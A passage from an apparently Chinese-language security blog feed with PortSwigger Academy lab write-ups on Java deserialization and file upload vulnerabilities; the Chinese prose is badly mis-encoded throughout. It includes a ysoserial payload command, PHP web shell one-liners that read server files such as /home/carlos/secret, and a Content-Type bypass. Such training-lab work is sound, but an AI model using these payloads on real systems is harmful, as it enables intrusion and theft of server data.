<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar \</span><br><span class="line">   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \</span><br><span class="line">   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \</span><br><span class="line">   --add-opens=java.base/java.net=ALL-UNNAMED \</span><br><span class="line">   --add-opens=java.base/java.util=ALL-UNNAMED \</span><br><span class="line">   [payload] <span class="string">&#x27;[command]&#x27;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="Labï¼šä½¿ç”¨Apache-Commonsåˆ©ç”¨Java-ååºåˆ—åŒ–">Labï¼šä½¿ç”¨Apache Commonsåˆ©ç”¨Java ååºåˆ—åŒ–</h4>
<p>æœ¬å®éªŒå®¤ä½¿ç”¨åŸºäºåºåˆ—åŒ–çš„ä¼šè¯æœºåˆ¶ï¼Œå¹¶åŠ è½½ Apache Commons Collections åº“ã€‚è™½ç„¶æ‚¨æ²¡æœ‰æºä»£ç è®¿é—®æƒé™ï¼Œä½†ä»å¯ä½¿ç”¨é¢„æ„å»ºçš„å°å·¥å…·é“¾æ¥åˆ©ç”¨æœ¬å®éªŒå®¤ã€‚</p>
<p>è¦è§£å†³è¯¥å®éªŒå®¤é—®é¢˜ï¼Œè¯·ä½¿ç”¨ç¬¬ä¸‰æ–¹å·¥å…·ç”Ÿæˆä¸€ä¸ªåŒ…å«è¿œç¨‹ä»£ç æ‰§è¡Œæœ‰æ•ˆè½½è·çš„æ¶æ„åºåˆ—åŒ–å¯¹è±¡ã€‚ç„¶åï¼Œå°†æ­¤å¯¹è±¡ä¼ å…¥ç½‘ç«™ï¼Œåˆ é™¤å¡æ´›æ–¯ä¸»ç›®å½•ä¸­çš„ <code>morale.txt</code> æ–‡ä»¶ã€‚</p>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>é¶åœºç»ƒä¹ </category>
      </categories>
      <tags>
        <tag>é¶åœº</tag>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€PortSwiggerå­¦é™¢ã€‘æ–‡ä»¶ä¸Šä¼ </title>
    <url>/posts/34bab347/</url>
    <content><![CDATA[<h2 id="åŸç†ä¸å±å®³">åŸç†ä¸å±å®³</h2>
<p>æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡ç½‘ç»œæœåŠ¡å™¨å…è®¸ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶åˆ°å…¶æ–‡ä»¶ç³»ç»Ÿï¼Œè€Œæœªå¯¹æ–‡ä»¶åã€ç±»å‹ã€å†…å®¹æˆ–å¤§å°ç­‰è¿›è¡Œå……åˆ†éªŒè¯ã€‚è¿™å°±å¯èƒ½å¯¼è‡´å…è®¸æ”»å‡»è€…ä¸Šä¼ æœ‰æ½œåœ¨å±é™©çš„æ–‡ä»¶ï¼Œç”šè‡³å¯èƒ½åŒ…æ‹¬æ”¯æŒè¿œç¨‹ä»£ç æ‰§è¡Œçš„æœåŠ¡å™¨ç«¯è„šæœ¬æ–‡ä»¶ã€‚</p>
<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¸Šä¼ æ–‡ä»¶æœ¬èº«å°±è¶³ä»¥é€ æˆç ´åã€‚å…¶ä»–æ”»å‡»å¯èƒ½æ¶‰åŠå¯¹æ–‡ä»¶çš„åç»­ HTTP è¯·æ±‚ï¼Œé€šå¸¸æ˜¯ä¸ºäº†è§¦å‘æœåŠ¡å™¨æ‰§è¡Œæ–‡ä»¶ã€‚</p>
<span id="more"></span>
<h2 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„å½±å“">æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„å½±å“</h2>
<p>æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„å½±å“é€šå¸¸å–å†³äºä¸¤ä¸ªå…³é”®å› ç´ ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ç½‘ç«™æœªèƒ½æ­£ç¡®éªŒè¯æ–‡ä»¶çš„å“ªä¸ªæ–¹é¢ï¼Œæ— è®ºæ˜¯æ–‡ä»¶å¤§å°ã€ç±»å‹è¿˜æ˜¯å†…å®¹ç­‰ã€‚</p>
</li>
<li class="lvl-2">
<p>æ–‡ä»¶ä¸Šä¼ æˆåŠŸåï¼Œå¯¹æ–‡ä»¶æ–½åŠ äº†å“ªäº›é™åˆ¶ã€‚</p>
</li>
</ul>
<p>åœ¨æœ€åçš„æƒ…å†µä¸‹ï¼Œæ–‡ä»¶ç±»å‹æ²¡æœ‰å¾—åˆ°æ­£ç¡®éªŒè¯ï¼ŒæœåŠ¡å™¨é…ç½®å…è®¸æŸäº›ç±»å‹çš„æ–‡ä»¶ï¼ˆå¦‚ .php å’Œ .jspï¼‰ä½œä¸ºä»£ç æ‰§è¡Œã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…æœ‰å¯èƒ½ä¸Šä¼ ä¸€ä¸ªæœåŠ¡å™¨ç«¯ä»£ç æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å¯ä½œä¸º web shell ä½¿ç”¨ï¼Œå°±å¯ä»¥å®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚</p>
<p>å¦‚æœæ–‡ä»¶åæ²¡æœ‰å¾—åˆ°æ­£ç¡®éªŒè¯ï¼Œæ”»å‡»è€…åªéœ€ä¸Šä¼ åŒåæ–‡ä»¶ï¼Œå°±èƒ½è¦†ç›–å…³é”®æ–‡ä»¶ã€‚å¦‚æœæœåŠ¡å™¨è¿˜å­˜åœ¨ç›®å½•éå†æ¼æ´ï¼Œè¿™å°±æ„å‘³ç€æ”»å‡»è€…ç”šè‡³å¯ä»¥å°†æ–‡ä»¶ä¸Šä¼ åˆ°æ„æƒ³ä¸åˆ°çš„ä½ç½®ï¼Œæ¯”å¦‚è¦†ç›–æœåŠ¡å™¨çš„ç³»ç»Ÿæ–‡ä»¶ã€‚</p>
<p>å¦‚æœä¸èƒ½ç¡®ä¿æ–‡ä»¶å¤§å°åœ¨é¢„æœŸçš„é˜ˆå€¼èŒƒå›´å†…ï¼Œè¿˜å¯èƒ½å¯¼è‡´æŸç§å½¢å¼çš„æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ï¼Œå³æ”»å‡»è€…å¡«æ»¡å¯ç”¨ç£ç›˜ç©ºé—´ã€‚</p>
<h2 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„">æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„</h2>
<p>å› ä¸ºæ–‡ä»¶ä¸Šä¼ æ¼æ´å·¨å¤§çš„å±å®³æ€§ï¼Œç½‘ç«™å¾ˆå°‘ä¼šå¯¹å…è®¸ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ä¸åŠ ä»»ä½•é™åˆ¶ã€‚æ›´å¸¸è§çš„æƒ…å†µæ˜¯ï¼Œå¼€å‘äººå‘˜å®æ–½ä»–ä»¬è®¤ä¸ºå¼ºå¤§çš„éªŒè¯ï¼Œä½†è¿™ç§éªŒè¯è¦ä¹ˆå­˜åœ¨å›ºæœ‰ç¼ºé™·ï¼Œè¦ä¹ˆå¾ˆå®¹æ˜“è¢«ç»•è¿‡ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå®ƒä»¬å¯èƒ½è¯•å›¾å°†å±é™©æ–‡ä»¶ç±»å‹åˆ—å…¥é»‘åå•ï¼Œä½†åœ¨æ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ—¶å´æ²¡æœ‰è€ƒè™‘åˆ°è§£æå·®å¼‚ã€‚ä¸ä»»ä½•é»‘åå•ä¸€æ ·ï¼Œé»‘åå•ä¹Ÿå¾ˆå®¹æ˜“ä¸å°å¿ƒé—æ¼æ›´éšè”½çš„æ–‡ä»¶ç±»å‹ï¼Œè€Œè¿™äº›æ–‡ä»¶ç±»å‹å¯èƒ½ä»ç„¶å…·æœ‰å±é™©æ€§ã€‚</p>
<p>åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œç½‘ç«™å¯èƒ½ä¼šå°è¯•é€šè¿‡éªŒè¯å±æ€§æ¥æ£€æŸ¥æ–‡ä»¶ç±»å‹ï¼Œè€Œè¿™äº›å±æ€§å¾ˆå®¹æ˜“è¢«ä½¿ç”¨ Burp Proxy æˆ– Repeater ç­‰å·¥å…·çš„æ”»å‡»è€…æ“çºµã€‚</p>
<p>æœ€åï¼Œå³ä½¿æ˜¯å¼ºå¤§çš„éªŒè¯æªæ–½ï¼Œåœ¨æ„æˆç½‘ç«™çš„ä¸»æœºå’Œç›®å½•ç½‘ç»œä¸­çš„åº”ç”¨ä¹Ÿå¯èƒ½ä¸ä¸€è‡´ï¼Œä»è€Œå¯¼è‡´å¯è¢«åˆ©ç”¨çš„å·®å¼‚ã€‚</p>
<h2 id="ç½‘ç»œæœåŠ¡å™¨å¦‚ä½•å¤„ç†é™æ€æ–‡ä»¶è¯·æ±‚">ç½‘ç»œæœåŠ¡å™¨å¦‚ä½•å¤„ç†é™æ€æ–‡ä»¶è¯·æ±‚</h2>
<p>åœ¨äº†è§£å¦‚ä½•åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¹‹å‰ï¼Œæ‚¨å¿…é¡»å¯¹æœåŠ¡å™¨å¦‚ä½•å¤„ç†é™æ€æ–‡ä»¶è¯·æ±‚æœ‰ä¸€ä¸ªåŸºæœ¬çš„äº†è§£ã€‚</p>
<p>è¿‡å»ï¼Œç½‘ç«™å‡ ä¹å®Œå…¨ç”±é™æ€æ–‡ä»¶ç»„æˆï¼Œå½“ç”¨æˆ·æå‡ºè¯·æ±‚æ—¶ï¼Œç½‘ç«™å°±ä¼šå‘ç”¨æˆ·æä¾›é™æ€æ–‡ä»¶ã€‚å› æ­¤ï¼Œæ¯ä¸ªè¯·æ±‚çš„è·¯å¾„éƒ½å¯ä»¥ä¸æœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„ç›®å½•å’Œæ–‡ä»¶å±‚æ¬¡ç»“æ„è¿›è¡Œ 1:1  çš„æ˜ å°„ã€‚å¦‚ä»Šï¼Œç½‘ç«™è¶Šæ¥è¶ŠåŠ¨æ€åŒ–ï¼Œè¯·æ±‚çš„è·¯å¾„å¾€å¾€ä¸æ–‡ä»¶ç³»ç»Ÿæ²¡æœ‰ä»»ä½•ç›´æ¥å…³ç³»ã€‚ä¸è¿‡ï¼Œç½‘ç»œæœåŠ¡å™¨ä»ç„¶è¦å¤„ç†ä¸€äº›é™æ€æ–‡ä»¶çš„è¯·æ±‚ï¼ŒåŒ…æ‹¬æ ·å¼è¡¨ã€å›¾åƒç­‰ã€‚</p>
<p>å¤„ç†è¿™äº›é™æ€æ–‡ä»¶çš„æµç¨‹å¤§è‡´ç›¸åŒã€‚æœåŠ¡å™¨ä¼šè§£æè¯·æ±‚ä¸­çš„è·¯å¾„ï¼Œä»¥ç¡®å®šæ–‡ä»¶æ‰©å±•åã€‚ç„¶åï¼ŒæœåŠ¡å™¨æ ¹æ®æ‰©å±•åå’Œ MIME ç±»å‹ä¹‹é—´çš„é¢„é…ç½®æ˜ å°„åˆ—è¡¨æ¥ç¡®å®šè¯·æ±‚çš„æ–‡ä»¶ç±»å‹ã€‚æ¥ä¸‹æ¥ä¼šå‘ç”Ÿä»€ä¹ˆå–å†³äºæ–‡ä»¶ç±»å‹å’ŒæœåŠ¡å™¨é…ç½®ã€‚</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>å¦‚æœè¯¥æ–‡ä»¶ç±»å‹ä¸å¯æ‰§è¡Œï¼Œå¦‚å›¾åƒæˆ–é™æ€ HTML é¡µé¢ï¼ŒæœåŠ¡å™¨å¯èƒ½åªä¼šåœ¨ HTTP å“åº”ä¸­å‘å®¢æˆ·ç«¯å‘é€æ–‡ä»¶å†…å®¹ã€‚</p>
</li>
<li class="lvl-2">
<p>å¦‚æœæ–‡ä»¶ç±»å‹æ˜¯å¯æ‰§è¡Œçš„ï¼Œå¦‚ PHP æ–‡ä»¶ï¼Œä¸”æœåŠ¡å™¨è¢«é…ç½®ä¸ºæ‰§è¡Œæ­¤ç±»æ–‡ä»¶ï¼Œé‚£ä¹ˆåœ¨è¿è¡Œè„šæœ¬ä¹‹å‰ï¼ŒæœåŠ¡å™¨ä¼šæ ¹æ® HTTP è¯·æ±‚ä¸­çš„å¤´å’Œå‚æ•°æ¥åˆ†é…å˜é‡ã€‚ç”±æ­¤äº§ç”Ÿçš„è¾“å‡ºç»“æœä¼šåœ¨ HTTP å“åº”ä¸­å‘é€ç»™å®¢æˆ·ç«¯ã€‚</p>
</li>
<li class="lvl-2">
<p>å¦‚æœæ–‡ä»¶ç±»å‹æ˜¯å¯æ‰§è¡Œçš„ï¼Œä½†æœåŠ¡å™¨æœªé…ç½®ä¸ºæ‰§è¡Œè¯¥ç±»å‹çš„æ–‡ä»¶ï¼Œåˆ™é€šå¸¸ä¼šå“åº”é”™è¯¯ã€‚ä¸è¿‡ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ–‡ä»¶å†…å®¹ä»ä¼šä»¥çº¯æ–‡æœ¬å½¢å¼æä¾›ç»™å®¢æˆ·ç«¯ã€‚è¿™ç§é”™è¯¯é…ç½®å¶å°”ä¼šè¢«åˆ©ç”¨æ¥æ³„éœ²æºä»£ç å’Œå…¶ä»–æ•æ„Ÿä¿¡æ¯ã€‚</p>
</li>
</ul>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        TIPS
    </div>
    <div class="spoiler-content">
        <p><code>Content-Type</code> å“åº”å¤´å¯æä¾›æœåŠ¡å™¨è®¤ä¸ºå®ƒå·²æä¾›çš„æ–‡ä»¶ç±»å‹çš„çº¿ç´¢ã€‚å¦‚æœåº”ç”¨ç¨‹åºä»£ç æ²¡æœ‰æ˜ç¡®è®¾ç½®è¯¥æ ‡å¤´ï¼Œå®ƒé€šå¸¸åŒ…å«æ–‡ä»¶æ‰©å±•å/MIME ç±»å‹æ˜ å°„çš„ç»“æœã€‚</p>

    </div>
</div>
<h2 id="åˆ©ç”¨ä¸å—é™åˆ¶çš„æ–‡ä»¶ä¸Šä¼ éƒ¨ç½²ç½‘ç»œå¤–å£³">åˆ©ç”¨ä¸å—é™åˆ¶çš„æ–‡ä»¶ä¸Šä¼ éƒ¨ç½²ç½‘ç»œå¤–å£³</h2>
<p>ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œæœ€ç³Ÿç³•çš„æƒ…å†µæ˜¯ç½‘ç«™å…è®¸æ‚¨ä¸Šä¼ æœåŠ¡å™¨ç«¯è„šæœ¬ï¼ˆå¦‚ PHPã€Java æˆ– Python æ–‡ä»¶ï¼‰ï¼Œå¹¶å°†å…¶é…ç½®ä¸ºä»£ç æ‰§è¡Œã€‚è¿™æ ·ï¼Œåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºè‡ªå·±çš„ç½‘ç»œå¤–å£³å°±å˜å¾—è½»è€Œæ˜“ä¸¾äº†ã€‚</p>
<blockquote>
<p>Web shell</p>
<p>Web shellæ˜¯ä¸€ç§æ¶æ„è„šæœ¬ï¼Œæ”»å‡»è€…åªéœ€å‘æ­£ç¡®çš„ç«¯ç‚¹å‘é€ HTTP è¯·æ±‚ï¼Œå°±èƒ½åœ¨è¿œç¨‹ç½‘ç»œæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤</p>
</blockquote>
<p>å¦‚æœä½ èƒ½æˆåŠŸä¸Šä¼ Web shellï¼Œä½ å®é™…ä¸Šå°±æ‹¥æœ‰äº†å¯¹æœåŠ¡å™¨çš„å®Œå…¨æ§åˆ¶æƒã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥è¯»å†™ä»»æ„æ–‡ä»¶ã€å¤–æ³„æ•æ„Ÿæ•°æ®ï¼Œç”šè‡³åˆ©ç”¨æœåŠ¡å™¨å¯¹å†…éƒ¨åŸºç¡€æ¶æ„å’Œç½‘ç»œå¤–çš„å…¶ä»–æœåŠ¡å™¨è¿›è¡Œé€è§†æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ PHP å•è¡Œç¨‹åºä»æœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿä¸­è¯»å–ä»»æ„æ–‡ä»¶ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/path/to/target/file&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¸€æ—¦ä¸Šä¼ ï¼Œå‘é€å¯¹è¯¥æ¶æ„æ–‡ä»¶çš„è¯·æ±‚å°±ä¼šåœ¨å“åº”ä¸­è¿”å›ç›®æ ‡æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<h4 id="Lab-é€šè¿‡Web-shell-ä¸Šä¼ è¿œç¨‹æ‰§è¡Œä»£ç ">Lab: é€šè¿‡Web shell ä¸Šä¼ è¿œç¨‹æ‰§è¡Œä»£ç </h4>
<p>æœ¬å®éªŒå®¤åŒ…å«ä¸€ä¸ªæ˜“å—æ”»å‡»çš„å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½ã€‚åœ¨å°†ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶å­˜å‚¨åˆ°æœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¹‹å‰ï¼Œå®ƒæ²¡æœ‰å¯¹è¿™äº›æ–‡ä»¶æ‰§è¡Œä»»ä½•éªŒè¯ã€‚</p>
<p>è¦è§£å†³è¯¥å®éªŒé—®é¢˜ï¼Œè¯·ä¸Šä¼ ä¸€ä¸ªåŸºæœ¬çš„<code>PHP web shell</code>ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥å¤–æ³„æ–‡ä»¶ <code>/home/carlos/secret</code> çš„å†…å®¹ã€‚ä½¿ç”¨å®éªŒå®¤æ¨ªå¹…ä¸­æä¾›çš„æŒ‰é’®æäº¤æ­¤ç§˜å¯†ã€‚</p>
<p>è¦è§£å†³è¯¥å®éªŒé—®é¢˜ï¼Œè¯·ä¸Šä¼ ä¸€ä¸ªåŸºæœ¬çš„ <code>PHP web shell</code>ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥å¤–æ³„æ–‡ä»¶ <code>/home/carlos/secret</code> çš„å†…å®¹ã€‚ä½¿ç”¨å®éªŒå®¤æ¨ªå¹…ä¸­æä¾›çš„æŒ‰é’®æäº¤æ­¤ç§˜å¯†ã€‚</p>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­æ®ç™»å½•è‡ªå·±çš„è´¦æˆ·ï¼š <code>wiener:peter</code></p>
<ol>
<li class="lvl-3">
<p>ç™»å½•é¢˜ç›®ç»™çš„è´¦æˆ·åï¼Œå¯ä»¥ä¸Šä¼ å¤´åƒ</p>
</li>
</ol>
<p><img src="/posts/34bab347//image-20250430120836773.png" alt="image-20250430120836773"></p>
<ol start="2">
<li class="lvl-3">
<p>ä¸Šä¼ 1.phpæ–‡ä»¶</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/home/carlos/secret&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/34bab347//image-20250430120903346.png" alt="image-20250430120903346"></p>
<ol start="3">
<li class="lvl-3">
<p>æ‰“å¼€å›¾åƒ</p>
</li>
</ol>
<p><img src="/posts/34bab347//image-20250430121009450.png" alt="image-20250430121009450"></p>
<p>æ€»ç»“ï¼šå‰ç«¯æ— é˜²æŠ¤ã€åç«¯æ— é˜²æŠ¤ã€æœåŠ¡å™¨å…·å¤‡æ‰§è¡Œæ¡ä»¶ã€‚</p>
<h2 id="åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ éªŒè¯çš„ç¼ºé™·">åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ éªŒè¯çš„ç¼ºé™·</h2>
<p>åœ¨ç½‘ç»œä¸­ï¼Œä½ ä¸å¤ªå¯èƒ½å‘ç°ä¸€ä¸ªç½‘ç«™åƒæˆ‘ä»¬åœ¨ä¸Šä¸€ä¸ªå®éªŒå®¤ä¸­çœ‹åˆ°çš„é‚£æ ·ï¼Œå¯¹æ–‡ä»¶ä¸Šä¼ æ”»å‡»æ²¡æœ‰ä»»ä½•é˜²æŠ¤æªæ–½ã€‚ä½†æ˜¯ï¼Œæœ‰äº†é˜²å¾¡æªæ–½ï¼Œå¹¶ä¸æ„å‘³ç€å®ƒä»¬å°±æ˜¯å¼ºå¤§çš„ã€‚æœ‰æ—¶ï¼Œä½ ä»ç„¶å¯ä»¥åˆ©ç”¨è¿™äº›æœºåˆ¶ä¸­çš„æ¼æ´æ¥è·å–ç½‘ç»œå¤–å£³ï¼Œä»è€Œè¿œç¨‹æ‰§è¡Œä»£ç ã€‚</p>
<h3 id="æ–‡ä»¶ç±»å‹éªŒè¯å­˜åœ¨ç¼ºé™·">æ–‡ä»¶ç±»å‹éªŒè¯å­˜åœ¨ç¼ºé™·</h3>
<p>åœ¨æäº¤ HTML è¡¨å•æ—¶ï¼Œæµè§ˆå™¨é€šå¸¸ä¼šåœ¨ <code>POST </code>è¯·æ±‚ä¸­å‘é€æ‰€æä¾›çš„æ•°æ®ï¼Œå†…å®¹ç±»å‹ä¸º  <code>application/x-www-form-url-encoded</code>ã€‚è¿™å¯¹äºå‘é€ç®€å•çš„æ–‡æœ¬ï¼ˆå¦‚å§“åæˆ–åœ°å€ï¼‰å¾ˆåˆé€‚ã€‚ä½†å®ƒä¸é€‚åˆå‘é€å¤§é‡äºŒè¿›åˆ¶æ•°æ®ï¼Œå¦‚æ•´ä¸ªå›¾åƒæ–‡ä»¶æˆ– PDF æ–‡æ¡£ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé¦–é€‰å†…å®¹ç±»å‹ä¸º <code>multipart/form-data</code>ã€‚</p>
<p>è€ƒè™‘ä¸€ä¸ªåŒ…å«ä¸Šä¼ å›¾ç‰‡ã€æä¾›å›¾ç‰‡è¯´æ˜å’Œè¾“å…¥ç”¨æˆ·åç­‰å­—æ®µçš„è¡¨å•ã€‚æäº¤è¿™æ ·çš„è¡¨å•åï¼Œå¯èƒ½ä¼šå¾—åˆ°ç±»ä¼¼ä¸‹é¢çš„è¯·æ±‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">POST /images HTTP/<span class="number">1.1</span></span><br><span class="line">    Host: normal-website.com</span><br><span class="line">    Content-Length: <span class="number">12345</span></span><br><span class="line">    Content-<span class="type">Type</span>: multipart/form-data; boundary=---------------------------012345678901234567890123456</span><br><span class="line"></span><br><span class="line">    ---------------------------012345678901234567890123456</span><br><span class="line">    Content-Disposition: form-data; name=<span class="string">&quot;image&quot;</span>; filename=<span class="string">&quot;example.jpg&quot;</span></span><br><span class="line">    Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">    [...binary content of example.jpg...]</span><br><span class="line"></span><br><span class="line">    ---------------------------012345678901234567890123456</span><br><span class="line">    Content-Disposition: form-data; name=<span class="string">&quot;description&quot;</span></span><br><span class="line"></span><br><span class="line">    This <span class="keyword">is</span> an interesting description of my image.</span><br><span class="line"></span><br><span class="line">    ---------------------------012345678901234567890123456</span><br><span class="line">    Content-Disposition: form-data; name=<span class="string">&quot;username&quot;</span></span><br><span class="line"></span><br><span class="line">    wiener</span><br><span class="line">    ---------------------------012345678901234567890123456--</span><br></pre></td></tr></table></figure>
<p>æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œæ¶ˆæ¯æ­£æ–‡è¢«åˆ†å‰²æˆä¸åŒçš„éƒ¨åˆ†ï¼Œåˆ†åˆ«ç”¨äºè¡¨å•çš„æ¯ä¸ªè¾“å…¥ã€‚æ¯ä¸ªéƒ¨åˆ†éƒ½åŒ…å«ä¸€ä¸ª <code>Content-Disposition</code>  æ ‡å¤´ï¼Œå®ƒæä¾›äº†ä¸è¾“å…¥å­—æ®µç›¸å…³çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ã€‚è¿™äº›å•ç‹¬çš„éƒ¨åˆ†è¿˜åŒ…å«è‡ªå·±çš„ <code>Content-Type</code> æ ‡å¤´ï¼Œå‘Šè¯‰æœåŠ¡å™¨ä½¿ç”¨æ­¤è¾“å…¥æäº¤çš„æ•°æ®çš„  MIME ç±»å‹ã€‚</p>
<p>ç½‘ç«™å°è¯•éªŒè¯æ–‡ä»¶ä¸Šä¼ çš„ä¸€ç§æ–¹æ³•æ˜¯æ£€æŸ¥ç‰¹å®šäºè¾“å…¥çš„ Content-Type æ ‡å¤´æ˜¯å¦ä¸é¢„æœŸçš„ MIME  ç±»å‹ç›¸åŒ¹é…ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæœåŠ¡å™¨åªæ¥æ”¶å›¾åƒæ–‡ä»¶ï¼Œå®ƒå¯èƒ½åªå…è®¸å›¾åƒ/jpeg å’Œå›¾åƒ/png  ç­‰ç±»å‹ã€‚å½“æœåŠ¡å™¨é»˜è®¤ä¿¡ä»»è¯¥æ ‡å¤´çš„å€¼æ—¶ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚å¦‚æœä¸æ‰§è¡Œè¿›ä¸€æ­¥çš„éªŒè¯æ¥æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦çœŸçš„ä¸å‡å®šçš„ MIME ç±»å‹ç›¸åŒ¹é…ï¼Œå°±å¯ä»¥ä½¿ç”¨  Burp Repeater ç­‰å·¥å…·è½»æ¾ç»•è¿‡è¿™ä¸€é˜²å¾¡ã€‚</p>
<h4 id="Lab-ç»•è¿‡å†…å®¹ç±»å‹é™åˆ¶ä¸Šä¼ ç½‘ç»œå¤–å£³">Lab: ç»•è¿‡å†…å®¹ç±»å‹é™åˆ¶ä¸Šä¼ ç½‘ç»œå¤–å£³</h4>
<p>æœ¬å®éªŒå®¤åŒ…å«ä¸€ä¸ªæ˜“å—æ”»å‡»çš„å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½ã€‚å®ƒè¯•å›¾é˜²æ­¢ç”¨æˆ·ä¸Šä¼ æ„å¤–çš„æ–‡ä»¶ç±»å‹ï¼Œä½†éœ€è¦ä¾é æ£€æŸ¥ç”¨æˆ·å¯æ§è¾“å…¥æ¥éªŒè¯ã€‚</p>
<p>è¦è§£å†³è¯¥å®éªŒé—®é¢˜ï¼Œè¯·ä¸Šä¼ ä¸€ä¸ªåŸºæœ¬çš„ <code>PHP web shell</code>ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥å¤–æ³„æ–‡ä»¶ <code>/home/carlos/secret</code> çš„å†…å®¹ã€‚ä½¿ç”¨å®éªŒå®¤æ¨ªå¹…ä¸­æä¾›çš„æŒ‰é’®æäº¤æ­¤ç§˜å¯†ã€‚</p>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­æ®ç™»å½•è‡ªå·±çš„è´¦æˆ·ï¼š <code>wiener:peter</code></p>
<ol>
<li class="lvl-3">
<p>ä¸Šä¼ PHPä»£ç å‘ç°è¿›è¡Œäº†å‰ç«¯é˜²æŠ¤</p>
</li>
</ol>
<p><img src="/posts/34bab347//image-20250430123852944.png" alt="image-20250430123852944"></p>
<ol start="2">
<li class="lvl-3">
<p>å°†Content-Typeä¿®æ”¹ä¸ºç¬¦åˆè§„å®šçš„å†…å®¹ï¼Œphpä»£ç ä¸å˜ï¼Œå³å¯ä¸Šä¼ æˆåŠŸ</p>
</li>
</ol>
<p><img src="/posts/34bab347//image-20250430123908753.png" alt="image-20250430123908753"></p>
<ol start="3">
<li class="lvl-3">
<p>è®¿é—®è´¦æˆ·çš„å¤´åƒé€šå…³</p>
</li>
</ol>
<p><img src="/posts/34bab347//image-20250430123725160.png" alt="image-20250430123725160"></p>
<p>æ€»ç»“ï¼šå‰ç«¯é˜²æŠ¤ï¼Œé™åˆ¶ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ï¼Œé€šè¿‡Burp Suitte ä¿®æ”¹æ–‡ä»¶åç»•è¿‡æ£€æµ‹ã€‚åç«¯æ— é˜²æŠ¤ï¼ŒæœåŠ¡å™¨å…·å¤‡æ‰§è¡Œæ¡ä»¶ã€‚</p>
<h3 id="é˜²æ­¢åœ¨ç”¨æˆ·å¯è®¿é—®çš„ç›®å½•ä¸­æ‰§è¡Œæ–‡ä»¶">é˜²æ­¢åœ¨ç”¨æˆ·å¯è®¿é—®çš„ç›®å½•ä¸­æ‰§è¡Œæ–‡ä»¶</h3>
<p>è™½ç„¶ä»ä¸€å¼€å§‹å°±é˜²æ­¢ä¸Šä¼ å±é™©æ–‡ä»¶ç±»å‹æ˜¾ç„¶æ›´å¥½ï¼Œä½†ç¬¬äºŒé“é˜²çº¿é˜»æ­¢æœåŠ¡å™¨æ‰§è¡Œä»»ä½•æ¼ç½‘è„šæœ¬ã€‚</p>
